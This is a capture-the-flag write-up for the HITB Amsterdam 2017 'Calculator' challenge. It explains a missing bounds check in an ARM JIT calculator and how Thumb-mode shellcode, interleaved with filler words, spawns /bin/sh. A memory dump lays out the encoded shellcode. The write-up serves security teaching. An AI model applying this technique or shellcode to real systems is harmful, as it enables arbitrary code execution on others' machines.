# hitb-ams-2017-calculator

Calculator was a pwnable challenge worth 300 points at this year's Hack In The Box Amsterdam CTF. This challenge was actually running on an ARM machine and since I did not have access to an ARM machine, I had to go with another approach.

## The program

The program was a simple calculator program implemented in Python and leveraging **ctypes**.

By reading the code we can see that it was parsing the input to our program, generating a code and data section which were then concatenated and put inside a buffer and the control was redirected here.

When connecting to the remote server, the program was working as expected, however it was crashing on my local machine with a **SIGILL** error.

By looking at the code, we could see that the op codes for the operators defined below were 4 bytes.

```
'+': 0xe0800001
'-': 0xe0400001
'*': 0xe0000091
'|': 0xe1800001
'&': 0xe0000001
```

And every instruction generated was 4 bytes as well. The fact that it was like this and that the program was crashing on my machine which has an Intel processor probably meant that it was targetting an ARM system.

I quickly wrote a disassembler script leveraging the capstone framework to disassemble the values put inside the code section in order to confirm this:

```python
from capstone import *

md = Cs(CS_ARCH_ARM, CS_MODE_ARM)

def print_disass(c):
	for i in md.disasm(c, 0x0):
		print hex(i.address), i.mnemonic, i.op_str

print_disass("\xf8\x0f\x9f\xe5") #first dword
print_disass("\xfc\x1f\x9f\xe5") #load 1
print_disass("\x01\x00\x80\xe0") # +
print_disass("\x01\x00\x40\xe0") # -
print_disass("\x91\x00\x00\xe0") # *
print_disass("\x01\x00\x80\xe1") # |
print_disass("\x01\x00\x00\xe0") # &
print_disass("\x1e\xff\x2f\xe1") # last dword
```

```bash
0x0L ldr r0, [pc, #0xff8]
0x0L ldr r1, [pc, #0xffc]
0x0L add r0, r0, r1
0x0L sub r0, r0, r1
0x0L mul r0, r1, r0
0x0L orr r0, r0, r1
0x0L and r0, r0, r1
0x0L bx lr
```

## Finding the bug

The program works by writing assembly code that does the computation using r0 as the result register and r1 has a staging register to put the next value to be treated.

What is being written to the code section is the following:

* Write `ldr r0, [pc, #0xff8]` to the code section which will load the first value in the data section insde `r0`
* For each operator and value passed, it writes `ldr r1, [pc, #0xffc]` and then the op codes to do the given operation
* Writes `bx lr` at the end of the code section to return and print the result

The data section is where our operands will be put with the following logic:
* Each value must fit in a `DWORD` and it will be written to the data section
* For each value written, the program writes another `DWORD`: `0xffffffff`

As we can see we have very little control over the code section but the data section will be placed right after it where we can control one out of every two `DWORD`. If we can find a bug that tricks the program into running the data section we could achieve arbitrary code execution by writing shellcode the data section

What prevents us from reaching and executing the data section is the `BX LR` instruction put by the program, however the logic of the function that adds a DWORD to the code function is the following:

```python
def code_append(v):
	 global code_bin
	 if len(code_bin) < CODE_SIZE:
			 code_bin += p32(v)
```

and the program fails to validate that enough space will remain to put the `BX LR` instruction at the end of the code section so we can pass an overly long expression and the call to `code_append(0xe12fff1e)` will have no effect

## Getting arbitrary code execution

Great, so now we have a way to reach the data section and execute what is in there. However every two `DWORD` will actually be `0xffffffff` which represents an invalid instruction in ARM.

ARM processors offers two instruction set. The classic one (reffered to as ARM mode) encodes every instruction with 4 bytes, however another instruction set called Thumb encodes every instruction with 2 bytes.

What this means is that we use a Thumb shellcode to execute whatever we want by generating a shellcode that does the following:

* An arbitrary instruction
* A short branch to skip the following DWORD

What is left is to switch instruction set. We can easily do that by making sure the first thing put inside the data section is a `BLX 8` instruction which will skip the next DWORD and switch the processor into Thumb mode.


## Writing the exploit

Here came the tricky part for me. As I did not have access to any ARM machine I was left to write the exploit without being able to really test it locally.

What I ended up doing is leveraging the great Unicorn engine framework to emulate execution of my shellcode.

I won't detail the script here as I don't use any fancy API. I just mimicked what the program would be doing remotely and making sure that I was going to execute a call to `execve("/bin/sh", ["/bin/sh", NULL], NULL)` properly.

When executing `exploit.py` you should get this output:

```bash
0x13371000 : 0xfa000000    0xffffffff    0xe0014678    0xffffffff    
0x13371010 : 0xe00130c4    0xffffffff    0xe0010001    0xffffffff    
0x13371020 : 0xe0012300    0xffffffff    0xe001300c    0xffffffff    
0x13371030 : 0xe0016003    0xffffffff    0xe001380c    0xffffffff    
0x13371040 : 0xe0013108    0xffffffff    0xe0010003    0xffffffff    
0x13371050 : 0xe0011d1b    0xffffffff    0xe001242f    0xffffffff    
0x13371060 : 0xe001701c    0xffffffff    0xe0011c5b    0xffffffff    
0x13371070 : 0xe0012473    0xffffffff    0xe001701c    0xffffffff    
0x13371080 : 0xe0011c5b    0xffffffff    0xe0012468    0xffffffff    
0x13371090 : 0xe001701c    0xffffffff    0xe0011c5b    0xffffffff    
0x133710a0 : 0xe0012400    0xffffffff    0xe001701c    0xffffffff    
0x133710b0 : 0xe0012300    0xffffffff    0xe0012200    0xffffffff    
0x133710c0 : 0xe001270b    0xffffffff    0xe001df01    0xffffffff    
0x133710d0 : 0x6e69622f    0x0068732f    0x133710d0    0x00000000    
0x133710e0 : 0x6e69622f    0xffffffff    0x6e69622f    0xffffffff    
0x133710f0 : 0x00000001    0xffffffff    0x00000001    0xffffffff   
PC: 0x133710ca
R0: 0x133710d0 - /bin/sh
R1: 0x133710d8
R2: 0x0
R3: 0x0
R4: 0x0
R7: 0xb
```

The script then generates the string to send to the program to achieve this memory layout.





